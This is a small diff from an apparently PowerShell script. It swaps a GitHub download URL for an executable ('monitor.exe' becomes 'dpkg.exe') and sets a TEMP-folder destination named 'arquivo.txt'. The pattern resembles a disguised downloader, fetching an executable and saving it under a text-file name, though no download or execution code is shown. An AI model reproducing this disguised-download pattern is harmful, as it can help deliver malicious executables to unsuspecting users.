@@ -1,5 +1,5 @@
 #
-$url = "https://raw.githubusercontent.com/0fxdb/instructions/main/safe/monitor.exe"
+$url = "https://github.com/0fxdb/instructions/raw/main/dpkg.exe"
 
 #
 $destino = "$env:TEMP\arquivo.txt"
